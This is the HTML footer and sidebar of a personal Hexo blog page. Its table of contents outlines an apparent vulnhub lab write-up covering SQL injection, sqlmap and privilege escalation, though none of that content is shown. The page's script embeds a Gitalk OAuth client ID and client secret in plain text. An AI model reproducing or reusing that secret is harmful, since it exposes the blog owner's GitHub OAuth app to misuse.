<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/24/SickOS1.2/">[vulnhub]  SickOS1.2 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Manual-SQLi"><span class="toc-number">2.1.</span> <span class="toc-text">Manual SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLMAP"><span class="toc-number">2.2.</span> <span class="toc-text">SQLMAP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-Esca"><span class="toc-number">3.</span> <span class="toc-text">Priv Esca</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>